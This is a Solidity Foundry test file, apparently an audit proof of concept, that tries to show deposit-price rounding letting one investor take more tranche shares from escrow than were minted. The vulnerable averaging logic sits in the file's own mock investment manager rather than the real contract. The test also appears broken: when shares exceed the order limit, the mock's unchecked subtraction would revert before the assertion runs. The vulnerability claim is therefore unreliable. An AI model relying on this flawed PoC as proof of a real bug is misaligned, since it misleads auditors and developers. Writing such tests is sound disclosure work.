// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "../../src/LiquidityPool.sol";

// Mock contracts for testing
contract MockAsset is IERC20 {
    string public name = "Mock Asset";
    string public symbol = "MASSET";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract MockTrancheToken is TrancheTokenLike {
    string public name = "Mock Tranche";
    string public symbol = "MTRANCHE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function checkTransferRestriction(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external pure {}
    function PERMIT_TYPEHASH() external pure returns (bytes32) { return bytes32(0); }
    function DOMAIN_SEPARATOR() external pure returns (bytes32) { return bytes32(0); }
}

contract MockInvestmentManager is InvestmentManagerLike {
    MockTrancheToken public trancheToken;
    MockAsset public asset;
    address public escrow;

    struct Order {
        uint128 maxDeposit;
        uint128 maxMint;
        uint128 depositPrice1;
        uint128 depositPrice2;
        bool hasTwoDeposits;
    }

    mapping(address => mapping(address => Order)) public orders;

    constructor(address _trancheToken, address _asset, address _escrow) {
        trancheToken = MockTrancheToken(_trancheToken);
        asset = MockAsset(_asset);
        escrow = _escrow;
    }

    function setupUserOrder(
        address user,
        address liquidityPool,
        uint128 _maxDeposit,
        uint128 _maxMint,
        uint128 _depositPrice1,
        uint128 _depositPrice2,
        bool _hasTwoDeposits
    ) external {
        orders[user][liquidityPool] = Order({
            maxDeposit: _maxDeposit,
            maxMint: _maxMint,
            depositPrice1: _depositPrice1,
            depositPrice2: _depositPrice2,
            hasTwoDeposits: _hasTwoDeposits
        });
    }

    function processDeposit(address receiver, uint256 assets) external returns (uint256) {
        Order storage order = orders[receiver][msg.sender];
        require(assets <= order.maxDeposit, "InvestmentManager/amount-exceeds-deposit-limits");

        uint256 depositPrice = calculateDepositPrice(receiver, msg.sender);
        require(depositPrice != 0, "LiquidityPool/deposit-token-price-0");

        uint256 shares = (assets * 1e18) / depositPrice;

        order.maxDeposit -= uint128(assets);
        order.maxMint -= uint128(shares);

        trancheToken.transferFrom(escrow, receiver, shares);
        return shares;
    }

    function processMint(address receiver, uint256 shares) external returns (uint256) {
        Order storage order = orders[receiver][msg.sender];
        require(shares <= order.maxMint, "InvestmentManager/amount-exceeds-mint-limits");

        uint256 depositPrice = calculateDepositPrice(receiver, msg.sender);
        require(depositPrice != 0, "LiquidityPool/deposit-token-price-0");

        uint256 assets = (shares * depositPrice) / 1e18;

        order.maxDeposit -= uint128(assets);
        order.maxMint -= uint128(shares);

        trancheToken.transferFrom(escrow, receiver, shares);
        return assets;
    }

    function calculateDepositPrice(address user, address liquidityPool) public view returns (uint256) {
        Order memory order = orders[user][liquidityPool];
        
        if (!order.hasTwoDeposits) {
            return order.depositPrice1;
        }

        uint256 totalAssets = order.maxDeposit;
        uint256 totalShares = order.maxMint;

        return (totalAssets * 1e18) / totalShares;
    }

    function processWithdraw(uint256, address, address) external pure returns (uint256) {
        revert("Not implemented");
    }

    function processRedeem(uint256, address, address) external pure returns (uint256) {
        revert("Not implemented");
    }

    function maxDeposit(address user, address liquidityPool) external view returns (uint256) {
        return orders[user][liquidityPool].maxDeposit;
    }

    function maxMint(address user, address liquidityPool) external view returns (uint256) {
        return orders[user][liquidityPool].maxMint;
    }

    function maxWithdraw(address, address) external pure returns (uint256) {
        return 0;
    }

    function maxRedeem(address, address) external pure returns (uint256) {
        return 0;
    }

    function totalAssets(uint256, address) external pure returns (uint256) {
        return 0;
    }

    function convertToShares(uint256 assets, address) external pure returns (uint256) {
        return assets;
    }

    function convertToAssets(uint256 shares, address) external pure returns (uint256) {
        return shares;
    }

    function previewDeposit(address, address, uint256 assets) external pure returns (uint256) {
        return assets;
    }

    function previewMint(address, address, uint256 shares) external pure returns (uint256) {
        return shares;
    }

    function previewWithdraw(address, address, uint256 assets) external pure returns (uint256) {
        return assets;
    }

    function previewRedeem(address, address, uint256 shares) external pure returns (uint256) {
        return shares;
    }

    function requestRedeem(uint256, address) external pure {}
    function requestDeposit(uint256, address) external pure {}
    function collectDeposit(address) external pure {}
    function collectRedeem(address) external pure {}
    function decreaseDepositRequest(uint256, address) external pure {}
    function decreaseRedeemRequest(uint256, address) external pure {}
}

contract ExploitTest is Test {
    LiquidityPool public liquidityPool;
    MockAsset public asset;
    MockTrancheToken public trancheToken;
    MockInvestmentManager public investmentManager;
    address public escrow;

    address public investor1;
    address public investor2;

    function setUp() public {
        // Setup test accounts
        investor1 = address(0x1);
        investor2 = address(0x2);
        escrow = address(0x3);

        // Deploy mock contracts
        asset = new MockAsset();
        trancheToken = new MockTrancheToken();
        
        // Deploy investment manager with escrow
        investmentManager = new MockInvestmentManager(
            address(trancheToken),
            address(asset),
            escrow
        );

        // Deploy liquidity pool
        liquidityPool = new LiquidityPool(
            1, // poolId
            bytes16(uint128(1)), // trancheId
            address(asset),
            address(trancheToken),
            address(investmentManager)
        );

        // Setup initial balances
        asset.mint(investor1, 1000e18);
        asset.mint(investor2, 1000e18);
    }

    function testDepositRoundingCausesInsufficientSharesInEscrow() public {
        // STEP 1: Simulate investor1 making two deposit requests at different epochs with different prices
        // First deposit: 100 assets at price 1.0 (1e18) -> 100 shares
        // Second deposit: 100 assets at price 1.5 (1.5e18) -> 66.666... shares
        // Total: 200 assets should give ~166.666... shares
        
        uint128 deposit1Assets = 100e18;
        uint128 deposit1Price = 1e18; // Price 1.0
        uint128 deposit1Shares = 100e18;
        
        uint128 deposit2Assets = 100e18;
        uint128 deposit2Price = 15e17; // Price 1.5
        uint128 deposit2Shares = 66666666666666666666; // 100 / 1.5 = 66.666...
        
        uint128 totalAssets = deposit1Assets + deposit2Assets; // 200e18
        uint128 totalShares = deposit1Shares + deposit2Shares; // 166.666...e18
        
        // STEP 2: Mint the exact amount of shares to escrow that should be available
        // This represents what Centrifuge chain minted based on the two deposits
        vm.prank(address(liquidityPool));
        trancheToken.mint(escrow, totalShares);
        
        // STEP 3: Setup investor1's order in the investment manager
        // The average price will be calculated as: totalAssets / totalShares
        investmentManager.setupUserOrder(
            investor1,
            address(liquidityPool),
            totalAssets,
            totalShares,
            deposit1Price,
            deposit2Price,
            true // hasTwoDeposits flag
        );
        
        // STEP 4: Approve escrow to transfer shares
        vm.prank(escrow);
        trancheToken.approve(address(investmentManager), type(uint256).max);
        
        // STEP 5: Investor1 claims their deposit using LiquidityPool.deposit()
        // The calculateDepositPrice will compute: (200e18 * 1e18) / 166.666...e18
        // This gives an average price that when used to calculate shares causes rounding
        vm.prank(investor1);
        uint256 sharesReceived = liquidityPool.deposit(totalAssets, investor1);
        
        // STEP 6: Verify the rounding issue
        // Due to the average price calculation and rounding, investor1 receives slightly more shares
        // than what was actually minted to escrow for their deposits
        console.log("Total shares minted to escrow:", totalShares);
        console.log("Shares received by investor1:", sharesReceived);
        console.log("Difference (extra shares):", sharesReceived > totalShares ? sharesReceived - totalShares : 0);
        
        // STEP 7: Check escrow balance - it should be depleted or have insufficient shares
        uint256 escrowBalance = trancheToken.balanceOf(escrow);
        console.log("Remaining escrow balance:", escrowBalance);
        
        // STEP 8: Now simulate investor2 who also has pending deposits
        // Setup investor2 with a small deposit that should be claimable
        uint128 investor2Assets = 50e18;
        uint128 investor2Shares = 50e18;
        
        vm.prank(address(liquidityPool));
        trancheToken.mint(escrow, investor2Shares);
        
        investmentManager.setupUserOrder(
            investor2,
            address(liquidityPool),
            investor2Assets,
            investor2Shares,
            1e18,
            0,
            false
        );
        
        // STEP 9: Investor2 tries to claim their deposit
        // This will fail if investor1 took more shares than they should have
        vm.prank(investor2);
        
        // If the vulnerability exists, this might fail or investor2 gets less than expected
        // because escrow doesn't have enough shares due to investor1's rounding advantage
        uint256 investor2SharesReceived = liquidityPool.deposit(investor2Assets, investor2);
        
        console.log("Investor2 shares received:", investor2SharesReceived);
        console.log("Investor2 expected shares:", investor2Shares);
        
        // ASSERTION: Demonstrate the vulnerability
        // The key issue is that investor1 received more shares than the exact amount
        // that was minted for their deposits due to rounding in price calculation
        assertTrue(
            sharesReceived > totalShares,
            "Vulnerability: Investor1 received more shares than minted for their deposits"
        );
        
        // This demonstrates that the escrow can be drained of shares beyond what should be allocated
        // In a real scenario with many users, this could prevent legitimate users from claiming
    }
}